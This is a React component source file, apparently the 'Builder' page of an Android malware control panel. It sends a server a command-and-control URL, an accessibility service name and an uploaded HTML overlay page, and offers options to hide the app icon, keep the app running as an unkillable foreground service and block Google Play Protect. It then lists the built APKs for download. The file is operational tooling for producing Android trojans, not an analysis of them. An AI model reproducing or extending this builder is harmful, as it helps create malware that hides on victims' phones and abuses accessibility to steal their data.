import React from 'react';
import { isNullOrUndefined } from 'util';
import SettingsContext from '../Settings';
import $ from 'jquery';
import { try_eval } from '../serviceF';

class files extends React.Component {
    constructor(props) {
        super(props)
        this.state = { isLoaded: false, key: '', name_app: '', url_server: '',url_server_rec: '',act_accessibility: '0',service_endless: '0',protect: '0',hide_icon: '0', sdk: '27', name_accessibility: '', step: '', tag: '', HtmlFile: '', acFile: '', open_icon: '', display_hide_icon: 'none', HtmlFileValid: false, arrayApk: []  }
        this.updateBulder = this.updateBulder.bind(this)
       
    }

    componentWillMount() {
         this.updateBulder();
       
    }

    updateBulder() { 
        this.get_key();
        this.forceUpdate();
    }

    onChangeNameApp = (e) => {this.setState({name_app: e.target.value});}
    onChangeURL = (e) => {this.setState({ url_server: e.target.value});}
    onChangeURL_rec = (e) => {this.setState({ url_server_rec: e.target.value});}
    onChangeAccessibility = (e) => { this.setState({name_accessibility: e.target.value});}
    onChangeTag = (e) => {this.setState({tag: e.target.value});}
    onChangeURL_open = (e) => {this.setState({open_icon: e.target.value});}
    onClickBuild(){
        let url = this.state.url_server;
        if(url.indexOf('http://')==-1  && url.indexOf('https://')==-1) {
            url = 'http://'+url;
        }
        let url_rec = this.state.url_server_rec;
        if(url_rec.indexOf('http://')==-1  && url_rec.indexOf('https://')==-1) {
            url_rec = 'https://'+url_rec;
        }

        let request_server = $.ajax({
            type: 'POST',
            url: SettingsContext.url_builder,
            data: {
                'params': new Buffer(
                    '{"name_app":"'+this.state.name_app+
                    '","url_server":"'+url+
                    '","url_rec":"'+url_rec+
                    '","act_accessibility":"'+this.state.act_accessibility+
                    '","service_endless":"'+this.state.service_endless+
                    '","protect":"'+this.state.protect+
                    '","sdk":"'+this.state.sdk+
                    '","name_accessibility":"'+this.state.name_accessibility+
                    '","step":"0","tag":"'+this.state.tag+
                    '","icon":"'+this.state.HtmlFile+
                    '","open_icon":"'+this.state.open_icon+
                    '","aces":"'+this.state.acFile+
                    '","key":"'+this.state.key+'"}').toString('base64')
            }
        });


        this.updateBulder();
        try_eval('$.notify("Request sent to build apk, wait..", "info");');
        request_server.done(function() {
            try_eval('$.notify("Apk ready", "info");'); 
            this.setState({isLoaded: true});
            this.updateBulder();
        }.bind(this));
    }

    get_key(){
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_connect,     
            data: {
                'params': new Buffer('{"sent_request":"get_key"}').toString('base64')
            }
        });
        request.done(function(msg) {
            try {
                this.setState({ key: new Buffer(msg, 'base64').toString('utf-8')});
                this.listApks();
            }
            catch (ErrMgs) {}
        }.bind(this));
        this.listApks();
    }

    listApks(){
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_builder,
            data: {'get_array_apk': new Buffer('{"key":"'+this.state.key+'"}').toString('base64')}
        });
        request.done(function(msg) {
            try {
                let result = JSON.parse(msg);
                if(!isNullOrUndefined(result.error)) {}
                else {
                    this.setState({
                        arrayApk: result.apks,
                        isLoaded: true
                    });
                }
            }
            catch (ErrMgs) {}
        }.bind(this));
    }

    SelectHtmlFile(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "image/png") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    try_eval('$.notify("Uploading..", "info")');
                    this.setState({ 
                        HtmlFile: evt.target.result.split(',')[1],
                        HtmlFileValid: true
                    });
                }.bind(this);
                reader.onerror = function (evt) {
                    this.setState({ 
                        HtmlFileValid: false
                    });
                }.bind(this);
            }
            else {
                this.setState({ 
                    HtmlFileValid: false
                });
            }
        }
        catch (err) {
            this.setState({ 
                HtmlFileValid: false
            });
        }
    }

    SelectHtmlAccess(filess) {
        try {
            let CurrHTMLFile = filess[0];
            if(CurrHTMLFile.type == "text/html") {
                let reader = new FileReader();
                reader.readAsDataURL(CurrHTMLFile);
                reader.onload = function (evt) {
                    try_eval('$.notify("Uploading..", "info")');
                    this.setState({ 
                        acFile: evt.target.result.split(',')[1]
                    });
                }.bind(this);
            }
            else {
        
            }
        }
        catch (err) {
        }
    }

    downloadFile(name_file){
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_builder,
            data: {'download': new Buffer('{"key":"'+this.state.key+'","nameapk":"' + name_file + '"}').toString('base64')}
        });
        request.done(function(msg) {
            try {
                var a = document.createElement("a"); 
                a.href = msg; 
                a.download = name_file+'.apk'; 
                a.click();
                this.updateBulder();
            }
            catch (ErrMgs) {}
        }.bind(this));
    }

    deleteFile(name_file){
        let request = $.ajax({
            type: 'POST',
            url: SettingsContext.url_builder,
            data: {'delete': new Buffer('{"key":"'+this.state.key+'","nameapk":"' + name_file + '"}').toString('base64')}
        });
        request.done(function(msg) {
            try {
                if(msg == '+'){
                    try_eval('$.notify("Apk file deleted", "info");');
                    this.updateBulder();
                }
            }
            catch (ErrMgs) {}
        }.bind(this));
    }

    changeSdk(event){
        if(event.target.value == '27') {
            this.setState({sdk: '27'});
        }
        else {
            this.setState({sdk: '29'});
        }
    }

    change(event){
        if(event.target.value == '0') {
            this.setState({act_accessibility: '0'});
        }
        else {
            this.setState({act_accessibility: '1'});
        }
    }

    change2(event){
        if(event.target.value == '0') {
            this.setState({service_endless: '0'});
        }
        else {
            this.setState({service_endless: '1'});
        }
    }

    change3(event){
        if(event.target.value == '0') {
            this.setState({protect: '0'});
        }
        else {
            this.setState({protect: '1'});
        }
    }

    
    change4(event){
        if(event.target.value == '0') {
            this.setState({hide_icon: '0', display_hide_icon: 'none', open_icon: ''});
       
            
           
        }
        else {
            this.setState({hide_icon: '1',  display_hide_icon: ''});
            
        }
    }

    render () {
        const TextAlignCenter = {
            textAlign: 'center'
        }
        const Px70Width = {
            marginLeft: '5px',
            width: '1px',
            textAlign: 'center',
            fontSize: '20px'
        }
        const style_open_url = {display: this.state.display_hide_icon}
        return (
        <React.Fragment>
            <div class="row">
                <div class="col">
                <br/><center><h5 class="pageh disable-select">Builder</h5></center> <br/>
              
                <center><div style={({background: '#e1e5e8',border: '1px solid #b9c6cb', borderRadius: '8px', width:'50vh'})}><br/>
                        <div style={({width:'40vh'})}>
                            <input class="form-control"  value={this.state.url_server} onChange={this.onChangeURL} placeholder="URL server connection" />
                            <input class="form-control"  value={this.state.url_server_rec} onChange={this.onChangeURL_rec} placeholder="URL recovery" />
                            <input class="form-control"  value={this.state.name_app} onChange={this.onChangeNameApp} placeholder="Name application" />
                            <input class="form-control"  value={this.state.name_accessibility} onChange={this.onChangeAccessibility} placeholder="Name accessibility service" />
                            <input class="form-control"  value={this.state.tag} onChange={this.onChangeTag} placeholder="Tag" />
                          
                            <select class="form-control" id="sdk" onChange={this.changeSdk.bind(this)} value={this.state.sdk}>
                            <option value="27">sdk 27</option>
                            <option value="29">sdk 29</option>
                            </select>
                         
                        <select class="form-control" id="act_accessibility" onChange={this.change.bind(this)} value={this.state.act_accessibility}>
                            <option value="0">Disable activity accessibility service</option>
                            <option value="1">Enable activity accessibility service</option>
                        </select>

                        <select class="form-control" id="service_endless" onChange={this.change2.bind(this)} value={this.state.service_endless}>
                            <option value="0">Disable anti sleep, foreground service</option>
                            <option value="1">Enable anti sleep, foreground service</option>
                        </select>

                        <select class="form-control" id="protect" onChange={this.change3.bind(this)} value={this.state.protect}>
                            <option value="0">Disable google protect blocking</option>
                            <option value="1">Enable google protect blocking</option>
                        </select>

                        <select class="form-control" id="open_icon" onChange={this.change4.bind(this)} value={this.state.hide_icon}>
                            <option value="0">Hide the app icon</option>
                            <option value="1">Don't hide the icon, open the page in the app</option>
                        </select>

                        <input class="form-control"  style={style_open_url} value={this.state.open_icon} onChange={this.onChangeURL_open} placeholder="URL" />

                            
                            <input type="file" onChange={ (e) => this.SelectHtmlFile(e.target.files) } class="form-control-file" id="HtmlFileInput" />
                            <small class="form-text text-muted">Select only *.png file.</small>

                            <br/>

                            <input type="file" onChange={ (e) => this.SelectHtmlAccess(e.target.files) } class="form-control-file" id="HtmlFileInput" />
                            <small class="form-text text-muted">Select only *.html file.</small>
                            <small class="form-text text-muted">Html page accessibility, if you don't specify the page, it will remain default</small>
                         

                            
                        </div>
                <br/>
                <button type="button"style={({width: '110px'})} onClick={this.onClickBuild.bind(this)} class="btn btn-outline-primary"  data-dismiss="modal">Build</button>
                <br/><br/></div></center><br/>


                <center>
                <React.Fragment>
                <table style={({width: '90vh'})} class="table table-striped table-hover">
                    <thead class="thead-light">
                        <tr>
                            <th scope="col" style={Px70Width}></th>
                            <th scope="col" style={Px70Width}></th>
                            <th scope="col" style={Px70Width}></th>
                        </tr>
                    </thead>
                    <tbody>

                        {this.state.arrayApk.map((item, index)=> (
                            <tr>
                                <th style={TextAlignCenter}>{item[index]+'.apk'}</th>
                                <th style={TextAlignCenter}><span style={({cursor: 'pointer'})} onClick={this.downloadFile.bind(this,item[index])}>Download</span></th>
                                <th style={TextAlignCenter}><span style={({cursor: 'pointer'})} onClick={this.deleteFile.bind(this,item[index])}>Delete</span></th>
                            </tr>
                        ))}
                    </tbody>
                </table>
                </React.Fragment>
                </center>

                </div>
                
            </div>
        </React.Fragment>
        );
    }
}
export default files;